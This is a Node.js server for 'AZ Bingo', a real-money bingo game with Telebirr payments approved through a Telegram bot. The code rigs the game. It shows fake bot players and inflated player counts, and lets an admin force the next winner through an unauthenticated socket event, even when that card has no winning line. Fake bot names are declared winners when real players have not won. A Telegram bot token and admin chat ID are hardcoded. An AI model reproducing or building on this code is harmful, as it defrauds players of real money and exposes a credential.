const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const axios = require('axios');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8816726564:AAG3ETwx98oBfjDV8I-BipzEXGZCnJPFezg";
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || "371093083";

let roundDuration = 60000;
let globalRoom = {
    gameActive: false,
    calledNumbers: [],
    gameStartTime: Date.now() + roundDuration,
    playersCount: 140,
    takenCards: [],
    playerRoundCards: {},
    playerTemporaryCards: {}
};

let forcedNextWinner = null; 
let activeGameInterval = null;
let gameRoundCounter = 0;
let currentRoundTargetCalls = 20;

const fakeBotNames = [
    "Abebe_Girma", "Ahmed_Kedir", "Mohammed_Amin", "Dawit_Kassaye", "Biruk_Moges", 
    "Kidus_Alemu", "Robel_Solomon", "Ermias_Tadesse", "Yared_Jemal", "Kaleb_Kassa", 
    "Yohannes_Lemma", "Fikadu_Mekonnen", "Tesfaye_Negash", "Bekele_Worku", "Assefa_Seifu", 
    "Girum_Teshome", "Surafel_Umer", "Nahom_Getachew", "Abenezer_Wondwossen", "Gedion_Yilma", 
    "Muluken_Zewdu", "Teferi_Alemu", "Shifera_Chala", "Tadesse_Fikru", "Gizachew_Girma", 
    "Zewdu_Moges", "Teshome_Demissie", "Tolosa_Gurmessa", "Abebech_Tsehay", "Almaz_Tadesse", 
    "Habtamu_Reta", "Esubalew_Kassa", "Mubarek_Nuru", "Bilal_Ahmed", "Siraj_Kedir", 
    "Redwan_Zemedkun", "Henok_Wondimu", "Daniel_Tesfaye", "Eyob_Mekonnen", "Teddy_Afro", 
    "Ali_Bira", "Yohana_Negash", "Zelalem_Worku", "Kebede_Bante", "Mulugeta_Assefa", 
    "Getachew_Bekele", "Dagnachew_Molla", "Asnake_Tadesse", "Wondwossen_Reta", "Mekdes_Lemma", 
    "Bruk_Zenebe", "Natnael_Chala", "Samuel_Dagne", "Michael_Fikru", "Ephrem_Haile", 
    "Addis_Boy", "Ethio_Pro", "Bingo_Master", "Telegram_VIP", "Addis_Vibes", 
    "Habesha_Style", "Nuru_Mohammed", "Bereket_Kassa", "Daniel_Tadesse", "Eyob_Lemma"
];

let pendingRequests = {};

let currentRandomBaseBots = 135;
function getRealisticBotsCount(realCount) {
    let nowHours = new Date().getHours();
    let timePools = [110, 125, 140, 160, 185, 200, 150, 130, 120];
    let poolIndex = nowHours % timePools.length;
    currentRandomBaseBots = timePools[poolIndex];

    let smallDelta = Math.floor(Math.random() * 9) - 4; 
    let calculated = currentRandomBaseBots + smallDelta;
    
    if (calculated < 90) calculated = 95;
    if (calculated > 210) calculated = 205;

    return calculated;
}

function refreshTakenCardsList() {
    let allTaken = [];
    Object.values(globalRoom.playerRoundCards).forEach(p => {
        if (p.cards) allTaken.push(...p.cards);
    });
    Object.values(globalRoom.playerTemporaryCards).forEach(cards => {
        if (cards) allTaken.push(...cards);
    });
    globalRoom.takenCards = Array.from(new Set(allTaken));
    io.emit('updateTakenCards', globalRoom.takenCards);
}

function simulateBotCardSelections() {
    if (globalRoom.gameActive) return;
    let available = [];
    for(let i = 1; i <= 500; i++) {
        if(!globalRoom.takenCards.includes(i)) available.push(i);
    }
    let botPicksCount = Math.floor(Math.random() * 15) + 10;
    for(let i = 0; i < botPicksCount && available.length > 0; i++) {
        let randIdx = Math.floor(Math.random() * available.length);
        let cardToTake = available.splice(randIdx, 1)[0];
        if(!globalRoom.takenCards.includes(cardToTake)) {
            globalRoom.takenCards.push(cardToTake);
        }
    }
    io.emit('updateTakenCards', globalRoom.takenCards);
}

setInterval(simulateBotCardSelections, 6000);

function generateCartelaNumbers(cardNum) {
    let cardNumbersByCol = { B: [], I: [], N: [], G: [], O: [] };
    let colRanges = { B: [1, 15], I: [16, 30], N: [31, 45], G: [46, 60], O: [61, 75] };
    let cols = ['B', 'I', 'N', 'G', 'O'];

    cols.forEach((col, colIdx) => {
        let range = colRanges[col];
        let pool = [];
        for (let n = range[0]; n <= range[1]; n++) pool.push(n);

        let seed = (cardNum * 7919) + (colIdx * 104729);
        for (let i = pool.length - 1; i > 0; i--) {
            seed = (seed * 9301 + 49297) % 233280;
            let rnd = seed / 233280;
            let j = Math.floor(rnd * (i + 1));
            let temp = pool[i]; pool[i] = pool[j]; pool[j] = temp;
        }
        cardNumbersByCol[col] = pool.slice(0, 5);
    });

    let flatList = [];
    for (let r = 0; r < 5; r++) {
        cols.forEach(col => {
            if (r === 2 && col === 'N') flatList.push("FREE");
            else flatList.push(cardNumbersByCol[col][r]);
        });
    }
    return flatList;
}

function checkWinningPattern(cardNum, calledNumbers) {
    let numbers = generateCartelaNumbers(cardNum);
    let matrix = [];
    for(let i = 0; i < 5; i++) matrix.push(numbers.slice(i * 5, i * 5 + 5));

    for(let r = 0; r < 5; r++) {
        if(matrix[r].every(val => val === "FREE" || calledNumbers.includes(val))) return true;
    }
    for(let c = 0; c < 5; c++) {
        let cMatch = true;
        for(let r = 0; r < 5; r++) {
            if(matrix[r][c] !== "FREE" && !calledNumbers.includes(matrix[r][c])) { cMatch = false; break; }
        }
        if(cMatch) return true;
    }
    let d1 = true;
    for(let i = 0; i < 5; i++) {
        if(matrix[i][i] !== "FREE" && !calledNumbers.includes(matrix[i][i])) { d1 = false; break; }
    }
    if(d1) return true;

    let d2 = true;
    for(let i = 0; i < 5; i++) {
        if(matrix[i][4 - i] !== "FREE" && !calledNumbers.includes(matrix[i][4 - i])) { d2 = false; break; }
    }
    if(d2) return true;

    let corners = [matrix[0][0], matrix[0][4], matrix[4][0], matrix[4][4]];
    if(corners.every(val => calledNumbers.includes(val))) return true;

    return false;
}

let telegramOffset = 0;
async function pollTelegramUpdates() {
    if (!TELEGRAM_BOT_TOKEN) return;
    try {
        let response = await axios.get(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`, {
            params: { offset: telegramOffset, timeout: 30 }
        });
        if (response.data && response.data.ok) {
            let updates = response.data.result;
            for (let update of updates) {
                telegramOffset = update.update_id + 1;
                if (update.callback_query) {
                    let callbackQuery = update.callback_query;
                    let data = callbackQuery.data; 
                    let chatId = callbackQuery.message.chat.id;
                    let messageId = callbackQuery.message.message_id;
                    let parts = data.split('_');
                    let action = parts[0]; 
                    let requestId = parts.slice(1).join('_');
                    let reqData = pendingRequests[requestId];
                    if (reqData) {
                        let targetSocket = io.sockets.sockets.get(reqData.socketId);
                        if (action === 'app') {
                            if (targetSocket) targetSocket.emit('financialApproved', { type: reqData.type, amount: reqData.amount });
                            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                                chat_id: chatId, message_id: messageId,
                                text: `✅ *ጥያቄው ጸድቋል!* (${reqData.amount} ብር)`, parse_mode: 'Markdown'
                            });
                        } else {
                            if (targetSocket) targetSocket.emit('financialRejected', { type: reqData.type, amount: reqData.amount });
                            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                                chat_id: chatId, message_id: messageId,
                                text: `❌ *ጥያቄው ተሰርዟል!*`, parse_mode: 'Markdown'
                            });
                        }
                        delete pendingRequests[requestId];
                    }
                    try { await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, { callback_query_id: callbackQuery.id }); } catch (e) {}
                }
            }
        }
    } catch (err) {}
    setTimeout(pollTelegramUpdates, 1000);
}
setTimeout(pollTelegramUpdates, 2000);

async function sendAdminFinancialRequest(requestId, type, amount, username, userId, currentBalance, phone, receipt) {
    if (!TELEGRAM_BOT_TOKEN || !ADMIN_CHAT_ID) return;
    let reqTypeTitle = type === 'deposit' ? '💳 ቴሌብር ዲፖዚት' : '🏧 ቴሌብር ዊዝድሮዋል';
    let message = `🔔 *AZ BINGO - ${reqTypeTitle}*\n\n👤 ስም: *${username || 'ተጫዋች'}*\n🆔 ዩዘር ID: \`${userId}\`\n💰 ቀሪ ሂሳብ: *${currentBalance} ብር*\n📥 የጠየቀው: *${amount} ብር*\n📱 ስልክ: ${phone || 'አልተሰጠም'}`;
    if (receipt) message += `\n\n📄 *ደረሰኝ / SMS:*\n\`${receipt}\``;
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: ADMIN_CHAT_ID, text: message, parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: [[{ text: "✅ አጽድቅ", callback_data: "app_" + requestId }, { text: "❌ ሰርዝ", callback_data: "rej_" + requestId }]] }
        });
    } catch (error) {}
}

let connectedRealPlayers = [];

io.on('connection', (socket) => {
    connectedRealPlayers.push(socket.id);
    let realCount = connectedRealPlayers.length;

    let currentBotsCount = getRealisticBotsCount(realCount);
    globalRoom.playersCount = currentBotsCount + realCount; 
    io.emit('updatePlayersCount', globalRoom.playersCount);

    socket.emit('syncGameState', globalRoom);
    refreshTakenCardsList();

    socket.on('tempSelectCards', (cards) => {
        if (Array.isArray(cards)) {
            globalRoom.playerTemporaryCards[socket.id] = cards;
            refreshTakenCardsList();
        }
    });

    socket.on('confirmCards', (data) => {
        let selectedCards = data.cards || data;
        let userId = String(data.userId || socket.id);

        let conflict = selectedCards.some(card => {
            let inOtherTemp = Object.entries(globalRoom.playerTemporaryCards).some(([sId, cList]) => sId !== socket.id && cList.includes(card));
            let inOtherConfirmed = Object.entries(globalRoom.playerRoundCards).some(([sId, p]) => sId !== socket.id && p.cards.includes(card));
            return inOtherTemp || inOtherConfirmed;
        });

        if (conflict) {
            socket.emit('cardSelectionError', "⚠️ ይቅርታ! ይህ ካርድ በሌላ ተጫዋች ተይዟል!");
            return;
        }

        delete globalRoom.playerTemporaryCards[socket.id];
        globalRoom.playerRoundCards[socket.id] = { cards: selectedCards, userId: userId, username: data.username || "ተጫዋች" };
        
        socket.emit('cardSelectionSuccess');
        refreshTakenCardsList();
    });

    socket.on('adminSetNextWinner', (data) => {
        forcedNextWinner = data.winnerType ? String(data.winnerType).trim() : null;
        socket.emit('adminWinnerResponse', { success: true, message: `✅ ቀጣዩ አሸናፊ ተስተካክሏል: ${forcedNextWinner}` });
    });

    socket.on('financialRequest', async (data) => {
        if (!data) return;
        let { type, amount, username, userId, currentBalance, phone, receipt } = data;
        if (!amount || amount < 100) {
            socket.emit('requestSubmitted', { success: false, message: '⚠️ ዝቅተኛው ገደብ 100 ብር ነው።' });
            return;
        }
        if (type === 'deposit' && (!receipt || receipt.length < 3)) {
            socket.emit('requestSubmitted', { success: false, message: '⚠️ እባክዎ የቴሌብር ደረሰኝ በትክክል ያስገቡ!' });
            return;
        }
        let requestId = 'req_' + Math.floor(Math.random() * 1000000);
        pendingRequests[requestId] = { userId, type, amount, socketId: socket.id };
        await sendAdminFinancialRequest(requestId, type, amount, username, userId, currentBalance, phone, receipt);
        socket.emit('requestSubmitted', { success: true, message: "✅ ጥያቄዎ ለአድሚን ተልኳል!" });
    });

    socket.on('disconnect', () => {
        connectedRealPlayers = connectedRealPlayers.filter(id => id !== socket.id);
        delete globalRoom.playerRoundCards[socket.id];
        delete globalRoom.playerTemporaryCards[socket.id];
        refreshTakenCardsList();

        let realCount = connectedRealPlayers.length;
        let currentBotsCount = getRealisticBotsCount(realCount);
        globalRoom.playersCount = currentBotsCount + realCount;
        io.emit('updatePlayersCount', globalRoom.playersCount);
    });
});

setInterval(() => {
    let now = Date.now();
    let realCount = connectedRealPlayers.length;

    if (!globalRoom.gameActive) {
        let currentBotsCount = getRealisticBotsCount(realCount);
        globalRoom.playersCount = currentBotsCount + realCount;
        io.emit('updatePlayersCount', globalRoom.playersCount);
    }

    let totalPlayers = globalRoom.playersCount;
    let realUserPercentage = totalPlayers > 0 ? (realCount / totalPlayers) * 100 : 0;
    let isRealDominant = realUserPercentage >= 80;

    if (!globalRoom.gameActive && now >= globalRoom.gameStartTime) {
        globalRoom.gameActive = true;
        globalRoom.calledNumbers = [];
        gameRoundCounter++;
        
        let randDist = Math.random();
        if (randDist < 0.25) {
            currentRoundTargetCalls = Math.floor(Math.random() * 5) + 12; 
        } else if (randDist < 0.70) {
            currentRoundTargetCalls = Math.floor(Math.random() * 11) + 17; 
        } else {
            currentRoundTargetCalls = Math.floor(Math.random() * 16) + 28; 
        }

        io.emit('gameStartedBroadcast');

        if (activeGameInterval) clearInterval(activeGameInterval);

        activeGameInterval = setInterval(() => {
            if (!globalRoom.gameActive) {
                clearInterval(activeGameInterval);
                return;
            }
            let available = Array.from({length: 75}, (_, i) => i + 1).filter(n => !globalRoom.calledNumbers.includes(n));
            if (available.length > 0) {
                let num = available[Math.floor(Math.random() * available.length)];
                globalRoom.calledNumbers.push(num);
                io.emit('numberCalledBroadcast', num);

                // 🟢 እዚህ ጋር ትክክለኛውን የድል መስመር (Winning Pattern Validation) እናረጋግጣለን
                let hasValidWinner = false;
                let winningCardsList = [];
                let activeSockets = Object.keys(globalRoom.playerRoundCards);

                // 1. የ forced / አድሚን አሸናፊ ምርጫ
                if (forcedNextWinner === "bot") {
                    let candidateCards = [];
                    for (let c = 1; c <= 500; c++) {
                        if (checkWinningPattern(c, globalRoom.calledNumbers)) candidateCards.push(c);
                    }
                    if (candidateCards.length > 0) {
                        let winningCard = candidateCards[Math.floor(Math.random() * candidateCards.length)];
                        let winningUser = fakeBotNames[Math.floor(Math.random() * fakeBotNames.length)];
                        winningCardsList.push({ username: winningUser, userId: "bot_forced", cardNum: winningCard });
                        hasValidWinner = true;
                    }
                } else if (forcedNextWinner === "random_real") {
                    let realPlayerSockets = activeSockets.filter(sId => {
                        let pData = globalRoom.playerRoundCards[sId];
                        return pData && !String(pData.userId).startsWith("bot");
                    });
                    for (let sId of realPlayerSockets) {
                        let pData = globalRoom.playerRoundCards[sId];
                        if (pData.cards) {
                            for (let cNum of pData.cards) {
                                if (checkWinningPattern(cNum, globalRoom.calledNumbers)) {
                                    winningCardsList.push({ username: pData.username, userId: pData.userId, cardNum: cNum });
                                    hasValidWinner = true;
                                    break;
                                }
                            }
                        }
                        if (hasValidWinner) break;
                    }
                    if (!hasValidWinner) {
                        let candidateCards = [];
                        for (let c = 1; c <= 500; c++) {
                            if (checkWinningPattern(c, globalRoom.calledNumbers)) candidateCards.push(c);
                        }
                        if (candidateCards.length > 0) {
                            let winningCard = candidateCards[Math.floor(Math.random() * candidateCards.length)];
                            let winningUser = fakeBotNames[Math.floor(Math.random() * fakeBotNames.length)];
                            winningCardsList.push({ username: winningUser, userId: "bot_fallback", cardNum: winningCard });
                            hasValidWinner = true;
                        }
                    }
                } else if (forcedNextWinner && forcedNextWinner.length > 0) {
                    for (let sId of activeSockets) {
                        let pData = globalRoom.playerRoundCards[sId];
                        if (String(pData.userId) === forcedNextWinner || sId === forcedNextWinner) {
                            if (pData.cards) {
                                for (let cNum of pData.cards) {
                                    if (checkWinningPattern(cNum, globalRoom.calledNumbers)) {
                                        winningCardsList.push({ username: pData.username || "ተጫዋች", userId: pData.userId, cardNum: cNum });
                                        hasValidWinner = true;
                                        break;
                                    }
                                }
                            }
                        }
                    }
                    // ካርዱ መስመር ካልሰራ ግን አድሚን በኃይል ካስገደደው (forced)፣ ቼኩን አልፈን ትክክለኛውን ካርድ እንወስዳለን
                    if (!hasValidWinner) {
                        for (let sId of activeSockets) {
                            let pData = globalRoom.playerRoundCards[sId];
                            if (String(pData.userId) === forcedNextWinner || sId === forcedNextWinner) {
                                if (pData.cards && pData.cards.length > 0) {
                                    winningCardsList.push({ username: pData.username || "ተጫዋች", userId: pData.userId, cardNum: pData.cards[0] });
                                    hasValidWinner = true;
                                }
                            }
                        }
                    }
                }

                // 2. የተለመደው መደበኛ የጨዋታ አሸናፊ ማረጋገጫ (ከተጠሩት ቁጥሮች ውስጥ በእርግጥ መስመር የሰራ ካርድ ካለ ብቻ)
                if (!hasValidWinner && (globalRoom.calledNumbers.length >= currentRoundTargetCalls || forcedNextWinner !== null)) {
                    // በመጀመሪያ የተያዙ የሪል ተጫዋቾች ካርዶች መስመር ሰርተው እንደሆነ እንፈትሻለን
                    for (let sId of activeSockets) {
                        let pData = globalRoom.playerRoundCards[sId];
                        if (pData && pData.cards) {
                            for (let cNum of pData.cards) {
                                if (checkWinningPattern(cNum, globalRoom.calledNumbers)) {
                                    winningCardsList.push({ username: pData.username, userId: pData.userId, cardNum: cNum });
                                    hasValidWinner = true;
                                    break;
                                }
                            }
                        }
                    }

                    // ሪል ተጫዋቾች ካልሠሩ, መስመር የሰራ ቦት ካርድ እንፈልጋለን
                    if (!hasValidWinner) {
                        let candidateCards = [];
                        for (let c = 1; c <= 500; c++) {
                            if (checkWinningPattern(c, globalRoom.calledNumbers)) candidateCards.push(c);
                        }
                        if (candidateCards.length > 0) {
                            let winningCard = candidateCards[Math.floor(Math.random() * candidateCards.length)];
                            let winningUser = fakeBotNames[Math.floor(Math.random() * fakeBotNames.length)];
                            winningCardsList.push({ username: winningUser, userId: "bot_" + Math.floor(Math.random() * 90000 + 10000), cardNum: winningCard });
                            hasValidWinner = true;
                        }
                    }
                }

                if (hasValidWinner && winningCardsList.length > 0) {
                    let totalPot = totalPlayers * 10;
                    let totalPrizePool = Math.floor(totalPot * 0.70);
                    let prizePerWinner = Math.floor(totalPrizePool / winningCardsList.length);

                    globalRoom.gameActive = false;
                    globalRoom.gameStartTime = Date.now() + roundDuration;
                    globalRoom.playerRoundCards = {};
                    globalRoom.playerTemporaryCards = {};
                    refreshTakenCardsList();
                    forcedNextWinner = null;

                    let primaryWinner = winningCardsList[0];
                    io.emit('bingoWinner', { 
                        username: primaryWinner.username, userId: primaryWinner.userId,
                        cardNum: primaryWinner.cardNum, playersCount: totalPlayers,
                        prize: prizePerWinner, winnersCount: winningCardsList.length,
                        calledNumbers: globalRoom.calledNumbers
                    });

                    clearInterval(activeGameInterval);
                }
            } else {
                globalRoom.gameActive = false;
                globalRoom.gameStartTime = Date.now() + roundDuration;
                globalRoom.playerRoundCards = {};
                globalRoom.playerTemporaryCards = {};
                refreshTakenCardsList();
                forcedNextWinner = null;
                io.emit('gameEndedBroadcast');
                clearInterval(activeGameInterval);
            }
        }, 5000); 
    }
}, 1000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log("AZ Bingo Server running on port " + PORT);
});
